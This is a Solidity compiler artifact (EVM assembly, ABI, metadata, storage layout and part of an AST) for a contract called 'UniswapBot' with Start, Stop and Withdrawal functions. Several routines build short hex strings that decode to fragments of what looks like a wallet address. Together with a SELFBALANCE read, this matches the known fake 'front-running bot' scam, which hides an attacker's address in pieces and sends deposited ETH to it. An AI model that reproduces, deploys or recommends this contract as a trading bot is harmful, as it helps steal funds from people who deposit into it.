											"name": "AND",
											"source": 3
										},
										{
											"begin": 4068,
											"end": 4076,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 4068,
											"end": 4076,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "110"
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4088,
											"end": 4091,
											"name": "PUSH",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 4082,
											"end": 4084,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4082,
											"end": 4091,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4082,
											"end": 4091,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 4082,
											"end": 4091,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 4082,
											"end": 4091,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "tag",
											"source": 3,
											"value": "110"
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "111"
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4107,
											"end": 4109,
											"name": "PUSH",
											"source": 3,
											"value": "57"
										},
										{
											"begin": 4101,
											"end": 4109,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4101,
											"end": 4109,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 4101,
											"end": 4109,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 4101,
											"end": 4109,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "112"
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "tag",
											"source": 3,
											"value": "111"
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4133,
											"end": 4135,
											"name": "PUSH",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 4127,
											"end": 4129,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4127,
											"end": 4135,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4127,
											"end": 4135,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 4127,
											"end": 4135,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 4127,
											"end": 4135,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4126,
											"end": 4150,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 4126,
											"end": 4150,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4126,
											"end": 4150,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "113"
										},
										{
											"begin": 4126,
											"end": 4150,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4126,
											"end": 4150,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4147,
											"end": 4149,
											"name": "PUSH",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 4141,
											"end": 4143,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4141,
											"end": 4149,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4141,
											"end": 4149,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 4141,
											"end": 4149,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 4141,
											"end": 4149,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4126,
											"end": 4150,
											"name": "tag",
											"source": 3,
											"value": "113"
										},
										{
											"begin": 4126,
											"end": 4150,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "114"
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4165,
											"end": 4167,
											"name": "PUSH",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 4159,
											"end": 4167,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4159,
											"end": 4167,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 4159,
											"end": 4167,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 4159,
											"end": 4167,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "115"
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "tag",
											"source": 3,
											"value": "114"
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4191,
											"end": 4193,
											"name": "PUSH",
											"source": 3,
											"value": "30"
										},
										{
											"begin": 4185,
											"end": 4187,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4185,
											"end": 4193,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4185,
											"end": 4193,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 4185,
											"end": 4193,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 4185,
											"end": 4193,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4184,
											"end": 4208,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 4184,
											"end": 4208,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4184,
											"end": 4208,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "116"
										},
										{
											"begin": 4184,
											"end": 4208,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4184,
											"end": 4208,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4205,
											"end": 4207,
											"name": "PUSH",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 4199,
											"end": 4201,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4199,
											"end": 4207,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4199,
											"end": 4207,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 4199,
											"end": 4207,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 4199,
											"end": 4207,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4184,
											"end": 4208,
											"name": "tag",
											"source": 3,
											"value": "116"
										},
										{
											"begin": 4184,
											"end": 4208,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4180,
											"end": 4232,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4180,
											"end": 4232,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "117"
										},
										{
											"begin": 4180,
											"end": 4232,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4223,
											"end": 4225,
											"name": "PUSH",
											"source": 3,
											"value": "30"
										},
										{
											"begin": 4217,
											"end": 4225,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4217,
											"end": 4225,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 4217,
											"end": 4225,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 4217,
											"end": 4225,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4180,
											"end": 4232,
											"name": "tag",
											"source": 3,
											"value": "117"
										},
										{
											"begin": 4180,
											"end": 4232,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "tag",
											"source": 3,
											"value": "115"
										},
										{
											"begin": 4122,
											"end": 4232,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "tag",
											"source": 3,
											"value": "112"
										},
										{
											"begin": 4063,
											"end": 4232,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4257,
											"end": 4259,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 4252,
											"end": 4254,
											"name": "PUSH",
											"source": 3,
											"value": "10"
										},
										{
											"begin": 4247,
											"end": 4249,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 4247,
											"end": 4254,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 4247,
											"end": 4259,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 4237,
											"end": 4260,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 4237,
											"end": 4260,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 4237,
											"end": 4260,
											"name": "SWAP4",
											"source": 3
										},
										{
											"begin": 4237,
											"end": 4260,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3792,
											"end": 3793,
											"name": "PUSH",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 3787,
											"end": 3793,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3787,
											"end": 3793,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3787,
											"end": 3793,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3787,
											"end": 3793,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "97"
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "tag",
											"source": 3,
											"value": "98"
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4285,
											"end": 4290,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4270,
											"end": 4291,
											"name": "SWAP5",
											"source": 3
										},
										{
											"begin": 4270,
											"end": 4291,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4270,
											"end": 4291,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4270,
											"end": 4291,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4270,
											"end": 4291,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4270,
											"end": 4291,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3573,
											"end": 4296,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 3573,
											"end": 4296,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3573,
											"end": 4296,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3573,
											"end": 4296,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 4944,
											"end": 5031,
											"name": "tag",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 4944,
											"end": 5031,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4987,
											"end": 4991,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 5005,
											"end": 5026,
											"name": "SELFBALANCE",
											"source": 3
										},
										{
											"begin": 4998,
											"end": 5026,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 4998,
											"end": 5026,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4944,
											"end": 5031,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 4944,
											"end": 5031,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 6504,
											"end": 6591,
											"name": "tag",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 6504,
											"end": 6591,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6553,
											"end": 6566,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "PUSH",
											"source": 3,
											"value": "3"
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "PUSH",
											"source": 3,
											"value": "3078450000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6574,
											"end": 6586,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6504,
											"end": 6591,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6504,
											"end": 6591,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 3454,
											"end": 3567,
											"name": "tag",
											"source": 3,
											"value": "48"
										},
										{
											"begin": 3454,
											"end": 3567,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3507,
											"end": 3520,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "PUSH",
											"source": 3,
											"value": "19"
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "PUSH",
											"source": 3,
											"value": "4162444446393530333537613242443863393634326633304200000000000000"
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3528,
											"end": 3562,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3454,
											"end": 3567,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3454,
											"end": 3567,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 2242,
											"end": 2341,
											"name": "tag",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 2242,
											"end": 2341,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2295,
											"end": 2308,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "PUSH",
											"source": 3,
											"value": "B"
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "PUSH",
											"source": 3,
											"value": "3339323432303430393734000000000000000000000000000000000000000000"
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2316,
											"end": 2336,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2242,
											"end": 2341,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2242,
											"end": 2341,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 4852,
											"end": 4938,
											"name": "tag",
											"source": 3,
											"value": "52"
										},
										{
											"begin": 4852,
											"end": 4938,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4900,
											"end": 4913,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "PUSH",
											"source": 3,
											"value": "3"
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "PUSH",
											"source": 3,
											"value": "4339380000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 4921,
											"end": 4933,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4852,
											"end": 4938,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 4852,
											"end": 4938,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"Start()": "1b55ba3a",
							"Stop()": "bedf0f4a",
							"Withdrawal()": "70e44c6a",
							"owner()": "8da5cb5b",
							"symbol()": "95d89b41"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdrawal\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"trade_bot.sol\":\"UniswapBot\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\":{\"keccak256\":\"0xa83ac0f597c04134b3ea423fd55d3077e952197c1991e23c4e304bfb35a90124\",\"urls\":[\"bzz-raw://ec1a3358caaa80af192bf4a8913041b037736412d7d6d5e894d58dadfab3a1da\",\"dweb:/ipfs/QmbYVrgxQZVevcBgTcPUFutk5mpj61BAdmTPMXGiBt1vA8\"]},\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\":{\"keccak256\":\"0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b\",\"urls\":[\"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65\",\"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi\"]},\"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\":{\"keccak256\":\"0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589\",\"urls\":[\"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6\",\"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f\"]},\"trade_bot.sol\":{\"keccak256\":\"0xbef9546c2c0c183de2f63a7378310f67b09ef5ea238ccac5dfa019707ddd9c3f\",\"urls\":[\"bzz-raw://5fa98f83d05f32d1e7e54ebe6d4f9b22987339ed66f5d94d96d86c1597de42d6\",\"dweb:/ipfs/QmV9eW7yt2tT2CWn2Mr7ktKsPB7fMfRRtuqqxcNtnmokY3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 88,
								"contract": "trade_bot.sol:UniswapBot",
								"label": "liquidity",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 90,
								"contract": "trade_bot.sol:UniswapBot",
								"label": "pool",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 92,
								"contract": "trade_bot.sol:UniswapBot",
								"label": "owner",
								"offset": 0,
								"slot": "2",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol",
					"exportedSymbols": {
						"IUniswapV2Migrator": [
							15
						]
					},
					"id": 16,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 15,
							"linearizedBaseContracts": [
								15
							],
							"name": "IUniswapV2Migrator",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "b7df1d25",
									"id": 14,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "migrate",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "token",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "78:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "78:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 5,
												"mutability": "mutable",
												"name": "amountTokenMin",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "93:19:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 4,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "93:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"mutability": "mutable",
												"name": "amountETHMin",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "114:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 6,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "114:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 9,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "133:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 8,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "133:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 11,
												"mutability": "mutable",
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "145:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 10,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "145:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "77:82:0"
									},
									"returnParameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "168:0:0"
									},
									"scope": 15,
									"src": "61:108:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 16,
